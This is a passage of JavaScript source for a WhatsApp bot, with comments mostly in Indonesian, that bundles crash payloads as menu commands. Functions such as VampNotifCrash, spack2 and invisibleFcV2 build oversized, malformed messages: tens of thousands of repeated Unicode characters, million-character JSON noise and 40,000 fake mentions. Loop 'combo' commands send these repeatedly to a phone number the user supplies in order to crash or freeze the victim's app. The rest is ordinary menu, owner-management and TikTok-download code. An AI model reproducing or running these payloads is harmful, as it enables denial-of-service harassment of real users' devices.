                                title: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸",
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸" + "ꦽ".repeat(9000) + "ꦾ".repeat(9000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "\u0003"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "\u0003"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await rayz.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.red("Thunder Nova Success Sending Bug"));
        }
        
        
const VampApiUi = JSON.stringify({
  status: true,
  criador: "VampireUI",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});

async function VampNotifCrash(target) {
  Aii.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸\n\n" + "ꦽ".repeat(5000),
          hasMediaAttachment: false
        },
        body: {
          text: "ꦾ".repeat(5000) + "ꦽ".repeat(5000),
        },
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(5000),
          buttons: [
            { name: "single_select", buttonParamsJson: VampApiUi },
            { name: "payment_method", buttonParamsJson: VampApiUi },
            { name: "form_message", buttonParamsJson: VampApiUi },
            { name: "catalog_message", buttonParamsJson: VampApiUi },
            { name: "send_location", buttonParamsJson: VampApiUi },
            { name: "review_and_pay", buttonParamsJson: VampApiUi }
          ]
        }
      }
    },
    { participant: { jid: target } }
  );
}

async function spack2(target) {
console.log(chalk.red(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "com.snowcorp.stickerly.android.stickercontentprovider 4fd4787a-6411-4116-acde-53cc59b95de5",
          name: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 "+ "ោ៝".repeat(30000),
          publisher: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" + "ោ៝".repeat(30000),
          caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
          stickers: [
            {
              fileName: "HzYPQ54bnDBMmI2Alpu0ER0fbVY6+QtvZwsLEkkhHNg=.webp",
              isAnimated: true,
              emojis: ["👾", "🩸"],
              accessibilityLabel: "@tamainfinity",
              stickerSentTs: "who know's ?",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            },
            {
              fileName: "GRBL9kN8QBxEWuJS3fRWDqAg4qQt2bN8nc1NIfLuv0M=.webp",
              isAnimated: false,
              emojis: ["🩸", "👾"],
              accessibilityLabel: "@tamainfinity_",
              stickerSentTs: "who know's ?",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            }
          ],
          fileLength: "728050",
          fileSha256: "jhdqeybzxe/pXEAT4BZ1Vq01NuHF1A4cR9BMBTzsLoM=",
          fileEncSha256: "+medG1NodVaMozb3qCx9NbGx7U3jq37tEcZKBcgcGyw=",
          mediaKey: "Wvlvtt7qAw5K9QIRjVR/vVStGPEprPr32jac0fig/Q0=",
          directPath: "/v/t62.15575-24/25226910_966451065547543_8013083839488915396_n.enc?ccb=11-4&oh=01_Q5AaIHz3MK0zl_5lrBfsxfartkbs4sSyx4iW3CtpeeHghC3_&oe=67AED5B0&_nc_sid=5e03e0",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            mentionedJid: ["13135550002@s.whatsapp.net"],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            dataSharingContext: {
              showMmDisclosure: true
            },
            quotedMessage: {
              callLogMesssage: {
              isVideo: false,
              callOutcome: "REJECTED",
              durationSecs: "1",
              callType: "VOICE_CHAT",
                participants: [
                  { jid: target, callOutcome: "CONNECTED" },
                  { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" }
                ]
              }
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: true,
              id: "9741OURQ"
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" + "ោ៝".repeat(10),
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              thumbnailUrl: "https://files.catbox.moe/tmaja2.jpg",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          },
          packDescription: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" + "ោ៝".repeat(100000),
          jpegThumbnail: "https://files.catbox.moe/tmaja2.jpg",
          mediaKeyTimestamp: "1736088676",
          trayIconFileName: "com.snowcorp.stickerly.android.stickercontentprovider 4fd4787a-6411-4116-acde-53cc59b95de5.png",
          thumbnailDirectPath: "/v/t62.15575-24/25226910_966451065547543_8013083839488915396_n.enc?ccb=11-4&oh=01_Q5AaIHz3MK0zl_5lrBfsxfartkbs4sSyx4iW3CtpeeHghC3_&oe=67AED5B0&_nc_sid=5e03e0",

thumbnailSha256: "FQFP03spSHOSBUTOJkQg/phVS1I0YqtoqE8DoFZ/cmw=",
          thumbnailEncSha256: "OALtE35ViGAkU7DROBsJ1RK1dgma/dLcjpvUg62Mj8c=",
          thumbnailHeight: 999999999,
          thumbnailWidth: 999999999,
          imageDataHash: "c6a15de8c2d205c6b1b344476f5f1af69394a9698ed1f60cb0e912fb6a9201c4",
          stickerPackSize: "723949",
          stickerPackOrigin: "THIRD_PARTY"
        }
      }
    }
  }, { userJid: target });
  await rayz.relayMessage(
    target,
    msg.message,
    target
      ? { participant: { jid: target, messageId: msg.key.id } }
      : {}
  );
}

async function crashbeta(target, ptcp = false) {
let BetaFc = "KekuatanBatangHitam" + "ꦾ".repeat(250000);
console.log(chalk.red(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
const messageContent = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        caption: BetaFc,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BetaFc
                    },
                    nativeFlowMessage: {}, // If needed, specify more details here
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [target],
                        groupMentions: [
                            { 
                                groupJid: "@120363321780343299@g.us", 
                                groupSubject: "mengjawa" 
                            }
                        ]
                    }
                }
            }
        }
    }
}
}

async function invisibleFcV2(target) {
    console.log(chalk.red(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
let OtaxSukaBokong = JSON.stringify({
  status: true,
  criador: "OtaxCrash",
  timestamp: Date.now(),
  noise: "}".repeat(1000000), // 1 juta karakter
  resultado: {
    type: "md",
    dummyRepeat: Array(100).fill({
      id: "OtaxBot" + Math.random(),
      message: "\u200f".repeat(5000),
      crash: {
        deepLevel: {
          level1: {
            level2: {
              level3: {
                level4: {
                  level5: {
                    loop: Array(50).fill("🪷".repeat(500))
                  }
                }
              }
            }
          }
        }
      }
    }),
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: -98411,
      _maxListeners: Infinity,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: new Array(500).fill([99, 99, 99]),
        browser: new Array(100).fill(["Chrome", "Linux"]),
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 100,
        keepAliveIntervalMs: 10,
        logger: {
          logs: Array(1000).fill("OtaxPenggodaJanda")
        },
        spam: Array(1000).fill("🪺").join(""),
        auth: { Object: "authData" },
        crashTrigger: {
          nullField: null,
          undefinedField: undefined,
          boolSwitch: [true, false, false, true, null],
          crazyArray: new Array(10000).fill(Math.random())
        },
        mobile: true
      }
    }
  }  
});
    const generateLocationMessage = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                        degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                    name: "ꦾ".repeat(10000),
                    address: "\u200f",
                  nativeFlowMessage: {
              messageParamsJson: "}".repeat(100000),
              },
                    contextInfo: {
                        mentionedJid: [
                            target,
                            ...Array.from({ length: 40000 }, () =>
                                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ],
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {});

    await rayz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: OtaxSukaBokong,
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    }, {
        participant: target
    });
}

/////Combo All fun Bug /////////
async function ComboInvis(target) {
for (let r = 0; r < 666; r++) {
await ForceX(target) 
await FcinvisAll(target)
await sleep(1000)
await ForceX(target) 
await FcinvisAll(target)
await sleep(1000)
await BlankScreen(target, Ptcp = true)
await propovers3(target, ptcp = true)
await invisibleFcV2(target)
}
}
async function Comboui(target) {
for (let i = 0; i < 4; i++) {
await propovers3(target, ptcp = true)
await propovers3(target, ptcp = true)
await BlankScreen(target, Ptcp = true)
await propovers3(target, ptcp = true)
await loadedIos(target, ptcp = true)
await BlankScreen(target, Ptcp = true)
await pedocrash(target, ptcp = true)
await spack2(target)
await VampNotifCrash(target)
await VampNotif2(target, ptcp = true)
}
}
async function fourcloseallwa(target) {
for (let i = 0; i < 40; i++) {
await VCrLSqL(target)
await FcinvisAll(target)
await VCrLSqL(target)
await sleep(1000)
await FcinvisAll(target)
await VCrLSqL(target)
await FcinvisAll(target)
await sleep(1000)
await crashbeta(target, ptcp = false)
await invisibleFcV2(target)
}
}
async function iphone(target) {
for (let i = 0; i < 100; i++) {
await VampiPhone(target, Ptcp = false)
await loadedIos(target)
await ForceX(target) 
await FcinvisAll(target)
await sleep(1000)
await ForceX(target) 
await FcinvisAll(target)
await sleep(1000)
}
}

        // Random Emoji //
        
const Moji1 = '🩸'
const Moji2 = '⚡'
const Moji3 = '🐉'
const ERandom = [Moji1, Moji2, Moji3]
let Feature = Math.floor(Math.random() * ERandom.length)
const emoji = ERandom[Feature]

        // Thumb Botz //

const thumb = fs.readFileSync('./lib/Image/thumb.jpg');

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('case.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `▢ Halo Kak, Apakah kakak sedang mencari ${prefix+mean}?\n▢ Nama menu : ${prefix+mean}`
rayz.sendMessage(m.chat, { image: thumb, caption: response }, {quoted: m})
}}

const sound = { 
key: {
fromMe: false, 
participant: `18002428478@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 9999999999999,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const hw = {
  key: {
    participant: '18002428478@s.whatsapp.net', 
    ...(m.chat ? {remoteJid: `status@broadcast`} : {})
  }, 
  message: {
    liveLocationMessage: {
      caption: `𝐊𝐚𝐡𝐟𝐢𝐌𝐨𝐨𝐝𝐓𝐳𝐲𝐲`,
      jpegThumbnail: ""
    }
  }, 
quoted: sound
} 

const loli = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: thumb,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const reply = (teks) => { 
rayz.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `Script KahfiMoofTzyy`,"body": `𝐊𝐚𝐡𝐟𝐢𝐌𝐨𝐨𝐝𝐓𝐳𝐲𝐲`, "previewType": "PHOTO","thumbnailUrl": `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=${command}`}}}, { quoted: hw})} 

const reaction = async (jidss, emoji) => {
rayz.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

switch (command) {

case 'start': 
case 'menu': {
let menu = `   
『ᖫᖭ』H啊啦咯包容
𝙳𝚎𝚟𝚕𝚘𝚙𝚎𝚛 : K҉a҉h҉f҉i҉M҉o҉o҉f҉T҉z҉y҉y҉
𝚅𝚎𝚛𝚜𝚒𝚘𝚗  : 𝟷𝟷
摸后价滴滚啊看等安毕竟啊可包容
⧼⧼━━━━･❪ \`𝙼𝚊𝚒𝚗𝙼𝚎𝚗𝚞\` ❫ ･━━━━⧽⧽
\`웃➫\` 𝐭𝐢𝐤𝐭𝐨𝐤 『𝚄𝚛𝚕』
\`웃➫\` 𝐡𝐝    『𝚁𝚎𝚙𝚕𝚊𝚢 𝚐𝚊𝚖𝚋𝚊𝚛』
\`웃➫\` 𝐫𝐯𝐨    『𝚁𝚎𝚙𝚕𝚊𝚢 𝚏𝚘𝚝𝚘 𝟷𝚡』
\`웃➫\` 𝐛𝐨𝐤𝐞𝐩 『 𝘙𝘢𝘯𝘥𝘰𝘮 𝘭𝘪𝘯𝘬 』
\`웃➫\` 𝐡𝐢𝐝𝐞𝐭𝐚𝐠
> 𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 𝘒𝘢𝘩𝘧𝘪𝘔𝘰𝘰𝘥𝘛𝘻𝘺𝘺
`
let buttons = [
        { buttonId: ".tqto", buttonText: { displayText: "Thanks To" } }
    ];

    let buttonMessage = {
        image: { url: global.thumb.menu },
	    gifPlayback: true,
        caption: menu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363349717663797@newsletter",
                newsletterName: `𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙆𝙖𝙝𝙛𝙞𝙈𝙤𝙤𝙙𝙏𝙯𝙮𝙮`,
            }
        },
        footer: "𝐊𝐚𝐡𝐟𝐢𝐌𝐨𝐨𝐝𝐓𝐳𝐲𝐲",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "©︎ Menu",
                    sections: [
                        {
                            title: "𝐊𝐚𝐡𝐟𝐢𝐌𝐨𝐨𝐟𝐓𝐳𝐲𝐲",
                            highlight_label: "",
                            rows: [
                                { title: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔", description: "𝐓𝐚𝐦𝐩𝐢𝐥𝐚𝐧 𝐔𝐧𝐭𝐮𝐤 𝐎𝐰𝐧𝐞𝐫𝐌𝐞𝐧𝐮", id: ".ownermenu" },
                                { title: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", description: "𝐓𝐚𝐦𝐩𝐢𝐥𝐚𝐧 𝐔𝐧𝐭𝐮𝐤 𝐁𝐮𝐠𝐌𝐞𝐧𝐮", id: ".bugmenu" }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

    await rayz.sendMessage(m.chat, buttonMessage, { quoted: loli });
};
break

case "bugmenu": {
let msgbug = `『ᖫᖭ』 \`𝘽𝙪𝙜𝙢𝙚𝙣𝙪\` 🐉
╔═━═━═━═━═━═━═━═━═━═╣
║囧 𝙐𝙞𝙨𝙮𝙨𝙩𝙚𝙢-𝙝𝙖𝙧𝙙
┃囧 𝙞𝙥𝙝𝙤𝙣𝙚-𝙘𝙧𝙖𝙨𝙝
║囧 𝙛𝙘-𝙗𝙚𝙩𝙖
┃囧 𝙘𝙤𝙢𝙗𝙤-𝙞𝙣𝙫𝙞𝙨
╚═╍═╍═╍═╍═╍═╍═╍═╍═╍╣
> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋᴀʜғɪᴍᴏᴏᴅᴛᴢʏʏ`
let buttons = [
        { buttonId: ".owner", buttonText: { displayText: "Owner" } }, 
        { buttonId: ".tqto", buttonText: { displayText: "Thanks To" } }
    ];

    let buttonMessage = {
        image: { url: global.thumb.menu },
	    gifPlayback: true,
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363349717663797@newsletter",
                newsletterName: "𝐊𝐚𝐡𝐟𝐢𝐌𝐨𝐨𝐝𝐓𝐳𝐲𝐲"
            }
        },
        footer: "𝐊𝐚𝐡𝐟𝐢𝐌𝐨𝐨𝐝𝐓𝐳𝐲𝐲",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await rayz.sendMessage(m.chat, buttonMessage, { quoted: loli });
}
break

case 'iphone-crash': {
if (!isBot) return reply('𝙈𝙖𝙖𝙛 𝘼𝙣𝙙𝙖 𝘽𝙡𝙢 𝙋𝙧𝙚𝙢 𝙆𝙤𝙣𝙩𝙤𝙡')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`𝐏𝐫𝐨𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐈𝐩𝐡𝐨𝐧𝐞𝐂𝐫𝐚𝐬𝐡`)
reply('𝐃𝐨𝐧𝐞 𝐁𝐮𝐠 𝐤𝐨𝐫𝐛𝐚𝐧')
// Memulai Crashing
await iphone(target)
rayz.sendMessage(from, {react: {text: "⚡", key: m.key}})
}
break

case 'fc-beta': {
if (!isBot) return reply('𝙈𝙖𝙖𝙛 𝘼𝙣𝙙𝙖 𝘽𝙡𝙢 𝙋𝙧𝙚𝙢 𝙆𝙤𝙣𝙩𝙤𝙡')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`𝐏𝐫𝐨𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐅𝐨𝐮𝐫𝐂𝐥𝐨𝐬𝐞`)
reply('𝐃𝐨𝐧𝐞 𝐁𝐮𝐠 𝐤𝐨𝐫𝐛𝐚𝐧')
// Memulai Crashing
await fourcloseallwa(target)
rayz.sendMessage(from, {react: {text: "☠", key: m.key}})
}
break

case 'combo-invis': {
if (!isBot) return reply('𝙈𝙖𝙖𝙛 𝘼𝙣𝙙𝙖 𝘽𝙡𝙢 𝙋𝙧𝙚𝙢 𝙆𝙤𝙣𝙩𝙤𝙡')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`𝐃𝐨𝐧𝐞 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐂𝐨𝐦𝐛𝐨-𝐈𝐧𝐯𝐢𝐬`)
// Memulai Crashing
await ComboInvis(target)
rayz.sendMessage(from, {react: {text: "🐉", key: m.key}})
}
break

case 'uisystem-hard': {
if (!isBot) return reply('𝙈𝙖𝙖𝙛 𝘼𝙣𝙙𝙖 𝘽𝙡𝙢 𝙋𝙧𝙚𝙢 𝙆𝙤𝙣𝙩𝙤𝙡')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`𝐏𝐫𝐨𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐔𝐢𝐬𝐲𝐬𝐭𝐞𝐦-𝐇𝐚𝐫𝐝`)
reply('𝐃𝐨𝐧𝐞 𝐁𝐮𝐠 𝐤𝐨𝐫𝐛𝐚𝐧')
// Memulai Crashing
await Comboui(target)
rayz.sendMessage(from, {react: {text: "🐉", key: m.key}})
}
break

case "tqto": {
let tqtoo = `
        [ 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 ]

𝘒𝘢𝘩𝘧𝘪𝘔𝘰𝘰𝘥𝘛𝘻𝘺𝘺 〖𝘖𝘸𝘯𝘦𝘳〗
𝘈𝘥𝘫𝘪 𝘗𝘦𝘯𝘨𝘦𝘴𝘵𝘶〖𝘍𝘳𝘪𝘦𝘯𝘥𝘴〗
𝘎𝘢𝘣𝘳𝘪𝘦𝘭 〖𝘍𝘳𝘪𝘦𝘯𝘥𝘴〗
𝘗𝘦𝘵𝘳𝘢〖𝘍𝘳𝘪𝘦𝘯𝘥𝘴〗
𝘈𝘱𝘳𝘰𝘋𝘩𝘪𝘵𝘦〖𝘍𝘳𝘪𝘦𝘯𝘥𝘴〗
`
let buttons = [
        { buttonId: ".owner", buttonText: { displayText: "Owner Menu" } }, 
        { buttonId: ".start", buttonText: { displayText: "Back To Menu" } }
    ];

    let buttonMessage = {
        image: { url: global.thumb.menu },
	    gifPlayback: true,
        caption: tqtoo,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363388161983216@newsletter",
                newsletterName: "𝐊𝐚𝐡𝐟𝐢𝐌𝐨𝐨𝐝𝐓𝐳𝐲𝐲",
            }
        },
        footer: "𝐊𝐚𝐡𝐟𝐢𝐌𝐨𝐨𝐝𝐓𝐳𝐲𝐲",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await rayz.sendMessage(m.chat, buttonMessage, { quoted: loli });
}
break

case "public": { 
if (!isBot) return reply(`\`Fitur Ini Hanya Dapat Diakses Oleh Owner Bot\``)
rayz.public = true
reply(`*\`Successfully Changed Bot Mode To Public\`*`)
}
break

case "self":
case "private": { 
if (!isBot) return reply(`\`Fitur Ini Hanya Dapat Diakses Oleh Owner Bot\``)
rayz.public = false
reply(`*\`Successfully Changed Bot Mode To Self/Private\`*`)
}
break

case "addowner":{
if (!isBot) return reply(`\`Khusus Owner ajg\``)
if (!args[0]) return reply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××*_`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await rayz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`*\`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!\`*`)
newOwner.push(prrkek)
fs.writeFileSync("./lib/Database/owner.json", JSON.stringify(newOwner))
reply(`*\`Nomor ${prrkek} Telah Menjadi Owner Bot!!\`*`)
}
break

case "delowner":{
if (!isOwner) return reply(`\`Khusus Owner ajg\``)
if (!args[0]) return reply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××*_`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = newOwner.indexOf(ya)
newOwner.splice(unp, 1)
fs.writeFileSync("./lib/Database/owner.json", JSON.stringify(newOwner))
reply(`*\`Nomor ${ya} Telah Di Hapus Dari Database Owner Bot!\`*`)
}    
break

case "addprem":{
if (!isBot) return reply("Khusus Ryy ajg")
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await rayz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
premium.push(prrkek)
fs.writeFileSync("./lib/Database/premium.json", JSON.stringify(premium))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break

case "delprem":{
if (!isBot) return reply("Khusus Ryy ajg")
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync("./lib/Database/premium.json", JSON.stringify(premium))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break

case "owner":
case "ownermenu": {
let own = `
╔═════【 \`OwnerMenu\` 】════╣
║可 addprem 
┃就 delprem
║和 delowner
┃啊 addowner
║他 self/public
╚═━═━═━═━═━═━═━═━╣`
let buttons = [
        { buttonId: ".bugmenu", buttonText: { displayText: "Bug Menu" } }, 
        { buttonId: ".start", buttonText: { displayText: "Back To Menu" } }
    ];

    let buttonMessage = {
        image: { url: global.thumb.menu },
	    gifPlayback: true,
        caption: own,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363349717663797@newsletter",
                newsletterName: "𝘊𝘩𝘢𝘯𝘯𝘦𝘭°𝐊𝐚𝐡𝐟𝐢𝐌𝐨𝐨𝐝𝐓𝐳𝐲𝐲",
            }
        },
        footer: "𝐊𝐚𝐡𝐟𝐢𝐌𝐨𝐨𝐝𝐓𝐳𝐲𝐲",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await rayz.sendMessage(m.chat, buttonMessage, { quoted: loli });
}
break
case "tt": case "tiktok": {
if (!text) return Reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("contoh : tiktok url"))
await tiktokDl(q).then(async (result) => {
await rayz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: rayz.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
